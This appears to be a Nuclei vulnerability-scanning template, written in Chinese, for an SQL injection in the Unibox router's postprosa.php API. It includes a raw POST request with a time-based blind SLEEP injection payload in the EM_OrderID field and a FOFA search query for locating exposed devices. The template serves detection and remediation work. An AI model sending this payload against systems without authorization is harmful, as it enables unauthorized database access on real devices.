id: unibox-postprosa-php-sql-injection

info:
  name: Unibox postprosa.php SQL注入漏洞
  author: qwtd
  severity: high
  description: |
    Unibox postprosa.php 存在SQL注入漏洞，攻击者可能借此获取数据库敏感信息、修改数据，并在受影响站点的上下文中执行未授权管理操作。
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/unibox%E8%B7%AF%E7%94%B1%E5%99%A8/unibox%E8%B7%AF%E7%94%B1%E5%99%A8postprosa%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="Unibox" && body="Controller"
  classification:
    cwe-id: CWE-89
  tags: Unibox
  remediation: >-
    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。

http:
  - raw:
      - |
        POST /api/postprosa.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
        Connection: close

        EM_OrderID=1'+AND+(SELECT+3676+FROM+(SELECT(SLEEP(2)))sdgB)+AND+'rBTA'%3d'rBTA
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: dsl
        dsl:
          - 'duration >= 6'
